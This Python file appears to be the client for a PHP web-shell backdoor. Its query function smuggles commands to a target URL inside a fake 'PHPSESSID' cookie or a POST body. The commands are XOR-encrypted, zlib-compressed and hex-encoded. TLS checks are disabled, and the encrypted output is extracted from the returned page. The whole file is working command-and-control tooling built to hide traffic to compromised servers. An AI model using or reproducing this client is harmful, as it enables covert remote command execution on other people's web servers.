#!/usr/bin/env python

import os
import re
import zlib
import random

from requests.adapters import HTTPAdapter
from requests import exceptions, Session as RequestsSession

import logging

class Session(RequestsSession):

    def __init__(self, *args, **kwargs):
        super(Session, self).__init__(*args, **kwargs)
        self.mount('http',HTTPAdapter())
        self.headers['User-Agent'] = user_agent()

def user_agent():
    return random.choice([
            'Mozilla/5.0',
    ])

def compress(payload):
    return zlib.compress(payload, 9)

def decompress(payload):
    if payload=='': return ''
    return zlib.decompress(payload)

def encrypt(payload, key):
    result = ''
    current = 0
    for ii in range(len(payload)):
        current = ord(payload[ii])\
                ^ ord(key[ii % len(key)])\
                ^ current
        result += chr(current)
    return result

def pad(length):
    return os.urandom(length)

def encode(payload, key, password, strength=None):
    key = key.decode('hex')
    password = password.decode('hex')
    return encrypt(pad(strength or len(key)) + password + payload, key)

def decrypt(payload, key):
    result = ''
    current = 0
    for ii in range(len(payload)):
        result += chr(ord(payload[ii])\
                      ^ ord(key[ii % len(key)])\
                      ^ current)
        current = ord(payload[ii])
    return result

def decode(payload, key, password, strength=None):
    key = key.decode('hex')
    password = password.decode('hex')
    data = decrypt(payload, key)
    block_size = strength or len(password)
    if data[block_size:block_size*2] == password:
        return data[block_size*2:]
    return ''

def std_encoder(payload, key, password):
    return payload

def std_decoder(data, key, password):
    return data

def hex_encoder(payload, key, password):
    return payload.encode('hex') # XXX

def hex_decoder(data, key, password):
    return data.decode('hex') # XXX

def query(url,
          cmd,
          key='',
          password='',
          session=None,
          action='PHPSESSID',
          encoder=std_encoder,
          decoder=std_decoder,
          via='cookie'):

    method = 'get'
    session = session or Session()
    payload = encoder(cmd, key, password)
    cookies = {}
    headers = {}
    data = None

    if via=='cookie':
        cookies[action]=payload
    elif via=='post':
        method = 'post'
        headers['Content-Type']='application/x-www-form-urlencoded'
        data = payload

    response = session.request(method=method,
                               url=url,
                               headers=headers,
                               cookies=cookies,
                               data=data,
                               timeout=300,
                               verify=False,
                               allow_redirects=True)

    data=''
    extract = re.compile('[0-9a-f]{33,}', re.I)
    for crypto in extract.findall(response.text):
        try:
            data = decoder(crypto, key, password).strip()
            break
        except:
            continue
    return data

def xor_gzip_encoder(payload, key, password):
    return encode(compress(payload), key, password).encode('hex')

def xor_gzip_decoder(data, key, password):
    return decompress(decode(data.decode('hex'), key, password))
